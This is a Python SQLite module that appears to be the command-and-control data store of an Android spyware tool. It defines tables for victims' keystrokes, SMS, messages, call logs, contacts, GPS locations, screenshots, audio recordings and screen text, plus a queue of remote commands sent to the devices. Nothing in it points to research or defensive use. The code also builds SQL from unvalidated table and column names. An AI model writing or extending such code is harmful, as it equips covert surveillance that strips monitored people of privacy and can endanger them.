import sqlite3
import os
import json
from datetime import datetime

DB_PATH = os.path.join(os.path.dirname(__file__), 'data', 'aura.db')

def get_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    return conn

def init_db():
    db = get_db()
    db.executescript('''
        CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            model TEXT,
            android_version TEXT,
            first_seen TEXT,
            last_seen TEXT,
            ip_address TEXT
        );

        CREATE TABLE IF NOT EXISTS keylogs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            app_package TEXT,
            text TEXT,
            timestamp TEXT,
            synced_at TEXT DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS notifications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            app_package TEXT,
            title TEXT,
            text TEXT,
            timestamp TEXT,
            synced_at TEXT DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            app_package TEXT,
            sender TEXT,
            text TEXT,
            is_incoming INTEGER DEFAULT 1,
            timestamp TEXT,
            synced_at TEXT DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            latitude REAL,
            longitude REAL,
            accuracy REAL,
            timestamp TEXT,
            synced_at TEXT DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            filename TEXT,
            timestamp TEXT,
            synced_at TEXT DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS contacts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            name TEXT,
            phone TEXT,
            phone_type TEXT,
            synced_at TEXT DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS sms (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            address TEXT,
            body TEXT,
            sms_type TEXT,
            timestamp TEXT,
            synced_at TEXT DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS call_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            number TEXT,
            call_type TEXT,
            duration INTEGER,
            timestamp TEXT,
            synced_at TEXT DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS apps (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            app_name TEXT,
            package_name TEXT,
            is_system INTEGER DEFAULT 0,
            synced_at TEXT DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS recordings (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            filename TEXT,
            recording_type TEXT,
            duration INTEGER,
            timestamp TEXT,
            synced_at TEXT DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            command TEXT,
            params TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            executed_at TEXT
        );

        CREATE TABLE IF NOT EXISTS screen_texts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            app_package TEXT,
            screen_text TEXT,
            timestamp TEXT,
            synced_at TEXT DEFAULT CURRENT_TIMESTAMP
        );
    ''')
    db.commit()
    db.close()

def insert_device(device_id, model, android_version, ip_address):
    db = get_db()
    db.execute('''
        INSERT OR REPLACE INTO devices (device_id, model, android_version, first_seen, last_seen, ip_address)
        VALUES (?, ?, ?, COALESCE((SELECT first_seen FROM devices WHERE device_id = ?), CURRENT_TIMESTAMP), CURRENT_TIMESTAMP, ?)
    ''', (device_id, model, android_version, device_id, ip_address))
    db.commit()
    db.close()

def insert_batch(table, rows):
    if not rows:
        return
    db = get_db()
    keys = rows[0].keys()
    placeholders = ', '.join(['?' for _ in keys])
    cols = ', '.join(keys)
    for row in rows:
        vals = [row[k] for k in keys]
        db.execute(f'INSERT INTO {table} ({cols}) VALUES ({placeholders})', vals)
    db.commit()
    db.close()

def get_pending_commands(device_id):
    db = get_db()
    rows = db.execute('SELECT id, command, params FROM commands WHERE device_id = ? AND status = ?', (device_id, 'pending')).fetchall()
    db.close()
    return [dict(r) for r in rows]

def mark_command_done(cmd_id, result=''):
    db = get_db()
    db.execute('UPDATE commands SET status = ?, result = ?, executed_at = CURRENT_TIMESTAMP WHERE id = ?', ('done', result, cmd_id))
    db.commit()
    db.close()

def add_command(device_id, command, params=''):
    db = get_db()
    db.execute('INSERT INTO commands (device_id, command, params) VALUES (?, ?, ?)', (device_id, command, params))
    db.commit()
    db.close()

def query(sql, params=()):
    db = get_db()
    rows = db.execute(sql, params).fetchall()
    db.close()
    return [dict(r) for r in rows]
